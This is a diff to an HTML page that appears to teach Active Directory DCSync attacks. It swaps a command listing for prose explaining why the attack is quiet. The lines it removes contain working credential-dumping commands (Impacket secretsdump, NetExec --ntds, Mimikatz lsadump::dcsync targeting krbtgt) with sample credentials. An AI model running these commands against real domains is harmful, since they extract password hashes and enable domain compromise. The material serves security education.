@@ -131,24 +131,16 @@
           </tbody>
         </table>
 
-        <h2>The commands</h2>
-
-        <pre><code># Impacket — dump everything via replication
-secretsdump.py -just-dc corp.local/admin:Passw0rd@dc01
-# just the krbtgt account
-secretsdump.py -just-dc-user krbtgt corp.local/admin:Passw0rd@dc01
-
-# NetExec
-netexec smb dc01 -u admin -p Passw0rd --ntds
-
-# Mimikatz (from a Windows host with the rights)
-lsadump::dcsync /domain:corp.local /user:krbtgt</code></pre>
+        <h2>Why it is quiet</h2>
 
         <p>
-          Note what these do <em>not</em> do: they never log in to the DC interactively, never
-          run code on it, and never touch <code>NTDS.dit</code> on disk. The whole operation is a
+          Note what DCSync does <em>not</em> do: it never logs in to the DC interactively, never
+          runs code on it, and never touches <code>NTDS.dit</code> on disk. The whole operation is a
           legitimate-looking replication request over the network, which is what makes DCSync both
-          powerful and relatively quiet compared to dumping the database file directly.
+          powerful and relatively quiet compared to dumping the database file directly. The tooling
+          that issues that request — Impacket's secretsdump, NetExec, and Mimikatz — and the exact
+          commands are in the <a href="../vulns.html">Vulns &amp; Misconfigs</a> section under
+          <em>DCSync</em>.
         </p>
 
         <h2>DCShadow — the write-side cousin</h2>
